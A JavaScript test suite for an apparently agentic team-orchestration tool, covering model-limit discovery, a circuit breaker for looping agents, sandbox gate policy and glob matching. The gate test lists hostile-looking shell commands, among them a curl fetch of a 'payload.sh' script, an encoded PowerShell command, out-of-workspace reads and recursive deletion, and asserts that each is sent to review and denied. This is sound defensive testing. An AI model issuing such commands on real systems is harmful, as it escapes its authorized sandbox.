import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { registerHooks } from 'node:module';
import { configWith } from './helpers.mjs';
import {
  parseUpstreamModelsPayload,
  fetchEndpointModelsCatalog,
  discoverRuntimeModels,
  enrichConfigModelsFromCatalog,
  mergeUpstreamModelsIntoConfig,
  resolveModelTarget,
  syncUpstreamModelsToDshSettings,
} from '../../leaderteam/core/upstream-models.mjs';
import { renderMagpieModelRows } from '../../leaderteam/core/model-config-writer.mjs';
import { roleRouteChain } from '../../leaderteam/core/role-routes.mjs';
import { classifySandboxBoundary, evaluateHardRules } from '../../leaderteam/core/gate-policy.mjs';
import { globToRegExp, matchesAnyGlob, globsOverlap, anyGlobOverlaps } from '../../leaderteam/core/paths.mjs';
import { MEMBER_SYSTEM } from '../../leaderteam/core/agreement.mjs';
import { SERIAL_REVIEW_SYSTEM } from '../../leaderteam/core/serial-review.mjs';
import {
  createAgentCircuitState,
  recordToolOutcomeInCircuit,
  recordTurnEndInCircuit,
} from '../../leaderteam/core/circuit-breaker.mjs';
import { runtime, teamStore } from '../../leaderteam/host/runtime.mjs';
import { onAgentStatus, onSessionEvent, onToolResult } from '../../leaderteam/host/roles.mjs';
import { runCircuitInvestigation } from '../../leaderteam/host/investigator.mjs';

registerHooks({
  resolve(specifier, context, nextResolve) {
    if (specifier.startsWith('@deepseek-ai/')) return { url: `virtual-v19:${specifier}`, shortCircuit: true };
    return nextResolve(specifier, context);
  },
  load(url, context, nextLoad) {
    if (url === 'virtual-v19:@deepseek-ai/dsh-tools') {
      return { format: 'module', shortCircuit: true, source: 'export const defineTool = d => d; export const TOOL_ABORTED_BEFORE_DISPATCH = "TOOL_ABORTED_BEFORE_DISPATCH";' };
    }
    if (url === 'virtual-v19:@deepseek-ai/dsh-tools/pipeline') {
      return {
        format: 'module',
        shortCircuit: true,
        source: [
          'export class ToolExecutionPipeline {',
          '  resolveExecution() { return { execute: async (args) => ({ content: [{ type: "text", text: "ok" }], args }) }; }',
          '  async dispatchToolBody(exec) {',
          '    const tool = this.resolveExecution(exec.name, exec.agent, exec.parent !== void 0, exec.toolSet);',
          '    return await tool.execute(exec.arguments, exec);',
          '  }',
          '}',
        ].join('\n'),
      };
    }
    if (url === 'virtual-v19:@deepseek-ai/dsh-tools/package.json') {
      return { format: 'json', shortCircuit: true, source: JSON.stringify({ version: '0.2.2-rc.1' }) };
    }
    if (url === 'virtual-v19:@deepseek-ai/dsh-llm') {
      return {
        format: 'module',
        shortCircuit: true,
        source: 'export class BlockAssembler { constructor() { this._b = []; } push(c) { if (c.type === "text") this._b.push(c); } blocks() { return this._b; } }',
      };
    }
    return nextLoad(url, context);
  },
});

const { resolveRoleWireMaxTokens, callRoleJson } = await import('../../leaderteam/host/llm.mjs');
const { Gate } = await import('../../leaderteam/host/final-gate.mjs');
const { registerTeamTools } = await import('../../leaderteam/host/team-tools.mjs');
const { recordOverview, recordStage } = await import('../../leaderteam/core/frontier.mjs');

test('[Req 1] Upstream /v1/models discovery passes real contextWindow & maxTokens end-to-end, removes 131072/16384 caps, and separates reasoning from output space', async () => {
  const rawModelsBody = {
    object: 'list',
    data: [
      { id: 'auto/deepseek-v4.1-flash-1017', context_window: 1048576, max_output_tokens: 384000, reasoning_levels: ['low', 'high', 'max'], modalities: { input: ['text', 'image'] } },
      { id: 'zcode/GLM-5.3', context_window: 1000000, max_output_tokens: 128000, reasoning_levels: ['low', 'high', 'max'], modalities: { input: ['text'] } },
      { id: 'codex/gpt-6.1-sol', context_length: 500000, max_tokens: 128000 },
      { id: 'bailian-token-plan/qwen4-max-preview' },
    ],
  };
  const parsed = parseUpstreamModelsPayload(rawModelsBody);
  assert.equal(parsed.find(m => m.id === 'auto/deepseek-v4.1-flash-1017').contextWindow, 1048576);
  assert.equal(parsed.find(m => m.id === 'auto/deepseek-v4.1-flash-1017').maxTokens, 384000);
  assert.equal(parsed.find(m => m.id === 'codex/gpt-6.1-sol').contextWindow, 500000);
  assert.equal(parsed.find(m => m.id === 'bailian-token-plan/qwen4-max-preview').maxTokens, undefined);

  // Mock DSH ctx where resolveModelInfo previously reported stale 131072 / 16384, and probeEndpoints fetches live /v1/models
  let updatedSettings = null;
  const mockCtx = {
    llm: {
      listProviders: () => [{ id: 'magpie', name: 'Magpie' }],
      listModels: async () => [{ id: 'zcode/GLM-5.3' }, { id: 'codex/gpt-6.1-sol' }, { id: 'bailian-token-plan/qwen4-max-preview' }],
      resolveModelInfo: async (_p, mid) => ({ name: mid, context: { contextWindow: 131072 }, defaultMaxTokens: 16384 }),
      listConfigurableProviders: () => [{ settingsNs: 'llm-pi-ai' }],
      discoverModels: async (_ns, req) => {
        assert.equal(req.baseURL, 'http://127.0.0.1:3425/v1', 'discoverModels receives baseURL so custom gateways succeed');
        return parsed;
      },
    },
    get(svc) {
      if (svc === 'settings') {
        return {
          describe: () => ({
            namespaces: [{
              ns: 'llm-pi-ai',
              data: {
                providers: {
                  magpie: {
                    api: 'openai-completions',
                    baseURL: 'http://127.0.0.1:3425/v1',
                    models: [
                      { id: 'zcode/GLM-5.3', contextWindow: 131072, maxTokens: 16384, input: ['text'], reasoningEfforts: { low: 'low', high: 'high', max: 'max' } },
                      { id: 'bailian-token-plan/qwen4-max-preview', contextWindow: 131072, maxTokens: 16384, input: ['text'] },
                    ],
                  },
                },
              },
            }],
          }),
          async update(_ns, data) { updatedSettings = data; },
        };
      }
      return null;
    },
  };

  const baseCfg = configWith({
    models: {
      ...configWith({}).models,
      // Explicit user override must take precedence over upstream discovery
      'codex/gpt-6.1-sol': {
        ...configWith({}).models['codex/gpt-6.1-sol'],
        maxTokens: 96000,
      },
      'bailian-token-plan/qwen4-max-preview': {
        family: 'qwen',
        label: 'Qwen4 Max Preview',
        efforts: ['none'],
        defaultEffort: 'none',
      },
    },
  });

  const catalog = await discoverRuntimeModels(mockCtx, baseCfg, {
    probeEndpoints: true,
    fetchImpl: async () => ({ ok: true, json: async () => rawModelsBody }),
  });
  const enriched = enrichConfigModelsFromCatalog(baseCfg, catalog);
  assert.equal(enriched.models['zcode/GLM-5.3'].contextWindow, 1000000);
  assert.equal(enriched.models['zcode/GLM-5.3'].maxTokens, 128000);
  assert.equal(enriched.models['codex/gpt-6.1-sol'].contextWindow, 500000);
  assert.equal(enriched.models['codex/gpt-6.1-sol'].maxTokens, 96000, 'user explicit maxTokens is never overwritten');
  assert.equal(enriched.models['bailian-token-plan/qwen4-max-preview'].maxTokens, undefined, 'unlisted upstream limits stay omitted rather than capped at 16384');

  // YAML row rendering: real capacities emitted when present, omitted when absent, ZERO 131072/16384
  const yamlRows = renderMagpieModelRows(enriched);
  assert.doesNotMatch(yamlRows, /131072|16384/);
  assert.match(yamlRows, /id: zcode\/GLM-5\.3, contextWindow: 1000000, maxTokens: 128000/);
  assert.match(yamlRows, /id: bailian-token-plan\/qwen4-max-preview, input: \[text\]\}/);

  // DSH settings sync updates GLM-5.3 to 1000000/128000 and strips stale 131072/16384 from qwen4-max-preview
  await syncUpstreamModelsToDshSettings(mockCtx, [
    { route: 'zcode/GLM-5.3', upstreamModel: 'zcode/GLM-5.3', efforts: ['low', 'high', 'max'], contextWindow: 1000000, maxTokens: 128000 },
    { route: 'bailian-token-plan/qwen4-max-preview', upstreamModel: 'bailian-token-plan/qwen4-max-preview', efforts: ['none'] },
  ]);
  const syncedGlm = updatedSettings.providers.magpie.models.find(m => m.id === 'zcode/GLM-5.3');
  const syncedQwen = updatedSettings.providers.magpie.models.find(m => m.id === 'bailian-token-plan/qwen4-max-preview');
  assert.equal(syncedGlm.contextWindow, 1000000);
  assert.equal(syncedGlm.maxTokens, 128000);
  assert.equal('contextWindow' in syncedQwen, false);
  assert.equal('maxTokens' in syncedQwen, false);

  // resolveModelTarget forwards model maxTokens to subagent agentOptions
  const glmTarget = resolveModelTarget(enriched, 'zcode/GLM-5.3', 'max');
  assert.deepEqual(glmTarget, { provider: 'magpie', model: 'zcode/GLM-5.3', reasoningEffort: 'max', maxTokens: 128000 });

  // Reasoning vs output separation in callRoleJson:
  // 1) High-effort serialReviewer with role.maxTokens=2400 passes full modelMaxTokens (128000) on the wire so <thinking> never starves output!
  const srChain = roleRouteChain(configWith({
    models: enriched.models,
    roles: { ...enriched.roles, serialReviewer: { route: 'zcode/GLM-5.3', effort: 'max', maxTokens: 2400, timeoutMs: 60000, retries: 0 } },
  }), 'serialReviewer');
  assert.equal(resolveRoleWireMaxTokens(srChain[0]), 128000);

  // 2) Native-thinking model with effort="none" that hits MAX-TOKENS under a role maxTokens ceiling retries once with full capacity
  const wireCapsSeen = [];
  const nativeThinkingLlm = {
    async *stream(req) {
      wireCapsSeen.push(req.maxTokens);
      if (req.maxTokens !== undefined) {
        yield { type: 'finish', reason: { kind: 'max-tokens' } };
        return;
      }
      yield { type: 'text', text: '{"adopt":"A"}' };
      yield { type: 'finish', reason: { kind: 'stop' } };
    },
  };
  const qwenArbiterChain = roleRouteChain(configWith({
    models: enriched.models,
    roles: { ...enriched.roles, arbiter: { route: 'bailian-token-plan/qwen4-max-preview', effort: 'none', maxTokens: 4000, timeoutMs: 60000, retries: 0 } },
  }), 'arbiter');
  const arbRes = await callRoleJson(nativeThinkingLlm, qwenArbiterChain, { system: 's', user: 'u' }, txt => ({ ok: true, value: JSON.parse(txt) }));
  assert.equal(arbRes.ok, true);
  assert.deepEqual(wireCapsSeen, [4000, undefined], 'retried automatically without artificial ceiling when native thinking hit truncation');
});

test('[Req 2 & 3] Productive member max-tokens continuations never trip circuit breaker; zero-progress soft tier steers without pausing and hard tier consolidates & resumes', async t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lt-v19-cb-'));
  t.after(() => fs.rmSync(tmp, { recursive: true, force: true }));
  const cfg = configWith({
    storage: { root: tmp },
    quota: { stateFile: null, allowUnknown: true, allowUnknownGpt: true },
    circuitBreaker: {
      zeroProgressTruncationSoft: 3,
      zeroProgressTruncationHard: 5,
      cooldownMs: 0,
    },
  });

  const rt = runtime();
  const prev = { ...rt };
  t.after(() => Object.assign(rt, prev));

  let investigatorMode = 'steer';
  let investigatorCalls = 0;
  const mockLlm = {
    async *stream() {
      investigatorCalls++;
      const payload = investigatorMode === 'steer'
        ? {
            diagnosis: 'Member emitted oversized single-file write that truncated thrice before tool execution',
            classification: 'recoverable_loop',
            action: 'load_deferred_tools',
            recovery_directive: 'Write skeleton first, then add functions incrementally with edit',
            recommended_adjustments: { load_tools: ['edit'], leader_max_parallel: null },
          }
        : {
            diagnosis: 'Repeated truncation on same giant literal table; consolidate and split writes',
            classification: 'recoverable_loop',
            action: 'steer_agent',
            recovery_directive: 'Resume from src/part-0.js..src/part-11.js already written and emit remaining table in two chunks',
            recommended_adjustments: { load_tools: [], leader_max_parallel: null },
          };
      yield { type: 'text', text: JSON.stringify(payload) };
      yield { type: 'finish', reason: { kind: 'stop' } };
    },
  };

  Object.assign(rt, {
    config: cfg,
    storageRoot: tmp,
    llm: mockLlm,
    actors: new Map(),
    stores: new Map(),
    reads: new Map(),
    memberExecutionProgress: new Map(),
    circuitStates: new Map(),
    teamConfigViews: new Map(),
  });
  const store = teamStore('team-cb-v19');
  store.ensure({ workspace: tmp });

  const followups = [];
  const steers = [];
  let cancelCount = 0;
  const session = { id: 'm-compiler', header: { cwd: tmp }, snapshotEvents: () => [] };
  const agent = {
    id: 'm-compiler',
    status: 'running',
    session,
    followup(m) { followups.push(m); },
    steer(m) { steers.push(m); },
    cancel() { cancelCount++; },
  };
  store.addMember({
    childId: 'm-compiler',
    name: 'impl-compiler',
    taskSeq: 1,
    stageId: 'compiler-core',
    stageHash: 'h1',
    profile: 'code',
    model: 'zcode/GLM-5.3',
    effort: 'max',
    allowedTools: ['read', 'write', 'edit'],
    loadedTools: ['read', 'write'], // 'edit' deferred
    writeScope: ['src/**'],
    refs: [],
    task: 'Implement compiler core',
    acceptance: ['All compiler tests pass'],
    cwd: tmp,
  });
  const actor = {
    role: 'member',
    teamId: 'team-cb-v19',
    agentId: 'm-compiler',
    agent,
    name: 'impl-compiler',
    profile: 'code',
    model: 'zcode/GLM-5.3',
    effort: 'max',
    stageId: 'compiler-core',
    allowedTools: ['read', 'write', 'edit'],
    loadedTools: ['read', 'write'],
    writeScope: ['src/**'],
    task: 'Implement compiler core',
    acceptance: ['All compiler tests pass'],
    cwd: tmp,
  };
  rt.actors.set('m-compiler', actor);
  onAgentStatus({}, { agent, status: 'running' });

  // 12 productive turns that each write a file and hit max-tokens: ZERO circuit-breaker investigations!
  for (let i = 0; i < 12; i++) {
    onToolResult({ agent, name: 'write', arguments: { file_path: `src/part-${i}.js` }, callId: `w-${i}` }, { content: [{ type: 'text', text: 'ok' }] });
    onSessionEvent({}, session, { type: 'turn/end', data: { reason: { kind: 'max-tokens' } } });
  }
  assert.equal(store.getMember('m-compiler').status, 'running');
  assert.equal(followups.length, 12);
  assert.equal(investigatorCalls, 0, 'productive max-tokens continuations never trigger circuit breaker');
  assert.equal(cancelCount, 0);

  // Now 3 zero-progress max-tokens turns -> Soft threshold triggers async Investigator WITHOUT cancelling/pausing!
  for (let i = 0; i < 3; i++) {
    onSessionEvent({}, session, { type: 'turn/end', data: { reason: { kind: 'max-tokens' } } });
  }
  await new Promise(r => setTimeout(r, 30));
  assert.equal(investigatorCalls, 1, 'soft threshold invokes independent Investigator');
  assert.equal(cancelCount, 0, 'soft threshold NEVER pauses or cancels the running chain');
  assert.ok(actor.loadedTools.includes('edit'), 'Investigator dynamically loaded authorized deferred tool "edit"');
  assert.equal(steers.length, 1, 'Investigator steered running agent in-flight');
  assert.equal(store.getMember('m-compiler').status, 'running');

  // 2 more zero-progress max-tokens turns reach Hard threshold (5) -> pauses, consolidates scene, and resumes original task!
  investigatorMode = 'consolidate';
  onSessionEvent({}, session, { type: 'turn/end', data: { reason: { kind: 'max-tokens' } } });
  onSessionEvent({}, session, { type: 'turn/end', data: { reason: { kind: 'max-tokens' } } });
  await new Promise(r => setTimeout(r, 30));
  assert.equal(investigatorCalls, 2);
  assert.equal(cancelCount, 1, 'hard threshold paused anomalous turn to consolidate');
  assert.equal(store.getMember('m-compiler').status, 'running', 'member remains alive and resumed on original task');
  const consolidations = store.workflowEvents().filter(e => e.type === 'circuit-consolidation');
  assert.equal(consolidations.length, 1);
  assert.ok(consolidations[0].completedOperations.includes('write(src/part-0.js)'));

  // Also verify diverse file reads (60 distinct files) NEVER falsely trip stagnant_spin_steps
  const readState = createAgentCircuitState('m-reader', 'member');
  for (let i = 0; i < 60; i++) {
    const d = recordToolOutcomeInCircuit(readState, { tool: 'read', targetSummary: `src/mod-${i}.js`, ok: true });
    assert.equal(d.trigger, 'none');
  }
});

test('[Req 4] Sandbox vs Auto division: in-sandbox write/edit/dispatch/pwsh execute with 0 Auto calls (by="sandbox"), cross-boundary ops enter Auto (by="model"), hard violations fail deterministically', async t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lt-v19-sandbox-auto-'));
  t.after(() => fs.rmSync(tmp, { recursive: true, force: true }));
  const ws = path.join(tmp, 'ws');
  fs.mkdirSync(path.join(ws, 'src'), { recursive: true });

  const cfg = configWith({
    storage: { root: path.join(tmp, 'store') },
    quota: { stateFile: null, allowUnknown: true, allowUnknownGpt: true },
  });
  assert.equal(cfg.gate.sandboxDirectAllow, true, 'production config defaults sandboxDirectAllow to true');

  const rt = runtime();
  const prev = { ...rt };
  t.after(() => Object.assign(rt, prev));

  let autoCalls = 0;
  let autoVerdict = { decision: 'allow', risk: 'medium', reason: 'approved external check' };
  const mockLlm = {
    async *stream() {
      autoCalls++;
      yield { type: 'text', text: JSON.stringify(autoVerdict) };
      yield { type: 'finish', reason: { kind: 'stop' } };
    },
  };

  const agent = { id: 'm-shell', session: { header: { cwd: ws, origin: 'subagent', parentSession: 'team-sa' } } };
  const actor = {
    role: 'member',
    teamId: 'team-sa',
    agentId: 'm-shell',
    agent,
    name: 'impl-vm',
    profile: 'shell',
    allowedTools: [...cfg.profiles.shell.tools, 'mcp_external_deploy'],
    loadedTools: [...cfg.profiles.shell.tools, 'mcp_external_deploy'],
    writeScope: ['src/**', 'build/**'],
    refs: [],
    task: 'Build and test VM',
    acceptance: ['Tests pass'],
    userTask: 'Build VM',
    cwd: ws,
  };
  const cfgWithExtra = configWith({
    storage: { root: path.join(tmp, 'store') },
    quota: { stateFile: null, allowUnknown: true, allowUnknownGpt: true },
    toolPolicy: { additionalTools: ['mcp_external_deploy'] },
  });

  Object.assign(rt, {
    config: cfgWithExtra,
    storageRoot: path.join(tmp, 'store'),
    llm: mockLlm,
    surface: 'headless',
    actors: new Map([['m-shell', actor]]),
    reads: new Map(),
    stores: new Map(),
    counters: { allowed: 0, denied: 0, uncontrolled: 0, reviewErrors: 0 },
  });
  const store = teamStore('team-sa');
  store.ensure({ workspace: ws, surface: 'headless' });
  const gate = new Gate({});

  // 1. In-sandbox operations -> decision: "allow", by: "sandbox", 0 Auto LLM calls!
  const inSandboxOps = [
    ['write', { file_path: 'src/vm.js', content: 'export const run = () => 42;\n' }],
    ['edit', { file_path: 'src/vm.js', old_string: '42', new_string: '43' }],
    ['pwsh', { command: 'node --test tests/vm.test.mjs', description: 'Run unit tests' }],
    ['pwsh', { command: `node "${ws.replace(/\\/g, '/')}/src/vm.js"`, description: 'Run VM binary via workspace path' }],
    ['pwsh', { command: 'git status && npm test', description: 'Check status and run tests' }],
    ['job_kill', { job_id: 'job-1' }],
  ];
  for (const [idx, [name, args]] of inSandboxOps.entries()) {
    const v = await gate.decide({ name, args, agent, actor, callId: `in-${idx}` });
    assert.equal(v.decision, 'allow', `${name} should allow`);
    assert.equal(v.by, 'sandbox', `${name} should be allowed by sandbox without Auto`);
  }
  assert.equal(autoCalls, 0, 'ZERO Auto LLM calls for normal in-sandbox operations');

  // 2. Hard-limit violations -> immediate deterministic rejection (`by: "rule:*"`), 0 Auto LLM calls!
  const hardDeny1 = await gate.decide({ name: 'write', args: { file_path: '../escape.js', content: 'x' }, agent, actor, callId: 'hard-1' });
  assert.equal(hardDeny1.decision, 'deny');
  assert.equal(hardDeny1.by, 'rule:path-outside-workspace');
  const hardDeny2 = await gate.decide({ name: 'write', args: { file_path: 'docs/readme.md', content: 'x' }, agent, actor, callId: 'hard-2' });
  assert.equal(hardDeny2.decision, 'deny');
  assert.equal(hardDeny2.by, 'rule:path-outside-write-scope');
  assert.equal(autoCalls, 0, 'hard violations rejected deterministically without calling Auto');

  // 3. Cross-boundary operations -> must enter independent Auto review (`by: "model"`)!
  const crossBoundaryCases = [
    ['pwsh', { command: 'node test.js', sandbox_permissions: 'require_escalated', justification: 'Need network' }],
    ['pwsh', { command: 'curl https://example.com/payload.sh' }],
    ['pwsh', { command: 'Get-Content C:\\Users\\Public\\outside.txt' }],
    ['pwsh', { command: 'Copy-Item src/vm.js $env:TEMP\\vm.js' }],
    ['pwsh', { command: 'Stop-Process -Name notepad' }],
    ['pwsh', { command: 'pwsh -EncodedCommand ZWNobyBoZWxsbw==' }],
    ['pwsh', { command: 'Remove-Item -Recurse build' }],
    ['mcp_external_deploy', { target: 'staging' }],
  ];
  autoVerdict = { decision: 'deny', risk: 'high', reason: 'cross-boundary operation not authorized by user task' };
  for (const [idx, [name, args]] of crossBoundaryCases.entries()) {
    const b = classifySandboxBoundary({ tool: name, args, actor, cwd: ws, platform: 'win32' }, cfgWithExtra);
    assert.equal(b.confined, false, `${name} ${JSON.stringify(args)} must be classified as crossing sandbox boundary`);
    const v = await gate.decide({ name, args, agent, actor, callId: `ext-${idx}` });
    assert.equal(v.by, 'model', `${name} must be reviewed by Auto`);
    assert.equal(v.decision, 'deny');
  }
  assert.equal(autoCalls, crossBoundaryCases.length, 'every cross-boundary operation entered Auto');
  assert.ok(store.gateReceipts().filter(r => r.by === 'sandbox').length === inSandboxOps.length, 'sandbox receipts persisted in gate.jsonl');
});

test('[Req 5] write_scope glob character classes ([0-9], [!0-9]) match and overlap accurately; coupled modules & unchanged approved stages skip redundant review', async t => {
  // Character class matching & evaluateHardRules
  assert.equal(globToRegExp('tests/0[1-9]_*.vela', 'win32').test('tests/05_arith.vela'), true);
  assert.equal(globToRegExp('tests/0[1-9]_*.vela', 'win32').test('tests/00_arith.vela'), false);
  assert.equal(globToRegExp('src/[!0-9]*.js', 'linux').test('src/parser.js'), true);
  assert.equal(globToRegExp('src/[!0-9]*.js', 'linux').test('src/1parser.js'), false);
  assert.equal(globToRegExp('src/[!0-9]*.js', 'linux').test('src/sub/parser.js'), false, 'negated class never crosses /');
  assert.equal(matchesAnyGlob('tests/12_loops.vela', ['tests/1[0-9]_*.vela'], 'win32'), true);

  // Disjoint vs overlapping character classes for concurrent member admission
  assert.equal(globsOverlap('tests/0[1-9]_*.vela', 'tests/1[0-9]_*.vela', 'win32'), false);
  assert.equal(globsOverlap('tests/[0-4]_*.vela', 'tests/[5-9]_*.vela', 'win32'), false);
  assert.equal(globsOverlap('tests/[0-5]_*.vela', 'tests/[5-9]_*.vela', 'win32'), true);
  assert.equal(anyGlobOverlaps(['src/pass_[a-f].js'], ['src/pass_[g-z].js'], 'linux'), false);
  assert.equal(anyGlobOverlaps(['src/[!0-9].js'], ['src/5.js'], 'linux'), false);
  assert.equal(anyGlobOverlaps(['src/[!0-9].js'], ['src/a.js'], 'linux'), true);

  const cfg = configWith({});
  const hit = evaluateHardRules({
    tool: 'write',
    args: { file_path: 'tests/07_closures.vela' },
    actor: { role: 'member', name: 'tester-1', allowedTools: ['read', 'write'], writeScope: ['tests/0[1-9]_*.vela'], unreadRefs: [] },
    cwd: 'D:\\vela',
    platform: 'win32',
  }, cfg);
  assert.equal(hit, undefined, 'valid file matching [1-9] write_scope is allowed by evaluateHardRules');

  // Review prompts explicitly protect coupled modules from forced splitting
  assert.match(MEMBER_SYSTEM, /NEVER automatically treat an unsplit parallel opportunity as a planning defect/);
  assert.match(MEMBER_SYSTEM, /Strongly coupled modules are explicitly allowed to be implemented continuously by a single member/);
  assert.match(SERIAL_REVIEW_SYSTEM, /Strongly coupled modules .* are explicitly well-suited to continuous implementation by a single member/);

  // Unchanged approved stage submitted to team_discuss returns existing approval immediately with 0 LLM calls
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lt-v19-noreview-'));
  t.after(() => fs.rmSync(tmp, { recursive: true, force: true }));
  const ws = path.join(tmp, 'ws');
  fs.mkdirSync(ws, { recursive: true });
  const rollCfg = configWith({
    storage: { root: path.join(tmp, 'store') },
    team: { rollingPlanning: true },
    quota: { stateFile: null, allowUnknown: true, allowUnknownGpt: true },
  });
  const rt = runtime();
  const prev = { ...rt };
  t.after(() => Object.assign(rt, prev));

  let reviewLlmCalls = 0;
  const mockLlm = {
    async *stream() {
      reviewLlmCalls++;
      yield { type: 'text', text: '{"stance":"approve","summary":"ok","reasons":["coupled compiler passes"],"required_changes":[]}' };
      yield { type: 'finish', reason: { kind: 'stop' } };
    },
  };
  const leaderAgent = {
    id: 'leader-roll',
    session: { seq: 1, header: { cwd: ws }, snapshotEvents: () => [{ type: 'user/message', data: { source: { kind: 'user' }, content: [{ type: 'text', text: 'Build compiler' }] } }] },
    model: { current: () => ({ provider: rollCfg.magpie.provider, model: rollCfg.roles.leader.route, reasoningEffort: rollCfg.roles.leader.effort }) },
  };
  const tools = new Map();
  const ctx = {
    effect: fn => fn(),
    tools: { register: d => tools.set(d.name, d), definitions: () => [{ name: 'read' }, { name: 'write' }, { name: 'edit' }, { name: 'pwsh' }] },
    get: () => null,
  };
  Object.assign(rt, {
    config: rollCfg,
    storageRoot: path.join(tmp, 'store'),
    llm: mockLlm,
    surface: 'headless',
    actors: new Map([[leaderAgent.id, { role: 'leader', teamId: leaderAgent.id, agentId: leaderAgent.id, agent: leaderAgent, cwd: ws, allowedTools: rollCfg.profiles.leader.tools }]]),
    stores: new Map(),
    teamConfigViews: new Map(),
  });
  const store = teamStore(leaderAgent.id);
  store.ensure({ workspace: ws, surface: 'headless' });
  registerTeamTools(ctx);

  recordOverview(store, 1, { summary: 'Compiler', approach: 'Cohesive frontend+codegen', acceptance: ['Tests pass'], estimated_minutes: 10, future_work: ['compiler-core'] });
  const stg = recordStage(store, 1, {
    stage_id: 'compiler-core',
    goal: 'Implement lexer, parser, checker, and bytecode emitter',
    method: 'Cohesive single-member implementation',
    acceptance: ['All tests pass'],
    interfaces: ['compile(src) -> bytecode'],
    profile: 'shell',
    tools: ['read', 'write', 'edit', 'pwsh'],
    write_scope: ['src/**'],
    serial_reason: 'Tightly coupled AST, symbol table, and bytecode emitter share internal invariants',
    ready: true,
  }).stage;
  store.saveAgreementInput('agr-core1', { kind: 'plan', taskSeq: 1, stageReview: stg });
  store.appendAgreementEvent({ type: 'created', id: 'agr-core1', kind: 'plan', taskSeq: 1, maxRounds: 3, maxArbiterAttempts: 2 });
  store.appendAgreementEvent({ type: 'opinion', id: 'agr-core1', round: 1, member: 'A', opinion: { stance: 'approve', summary: 'ok', reasons: ['ok'], suggestions: [], requiredChanges: [] } });
  store.appendAgreementEvent({ type: 'opinion', id: 'agr-core1', round: 1, member: 'B', opinion: { stance: 'approve', summary: 'ok', reasons: ['ok'], suggestions: [], requiredChanges: [] } });
  store.appendWorkflowEvent({ type: 'execution-review-result', taskSeq: 1, reviewId: 'rev-1', stageId: stg.id, stageHash: stg.hash, result: { status: 'settled', id: 'agr-core1', outcome: { decision: 'approve' } } });

  const res = await tools.get('team_discuss').execute({ kind: 'plan', stage_id: 'compiler-core', topic: 'Re-check compiler-core' }, { agent: leaderAgent });
  assert.equal(res.existing, true);
  assert.equal(res.id, 'agr-core1');
  assert.equal(reviewLlmCalls, 0, 'already-approved unchanged stage never re-enters full review');
});
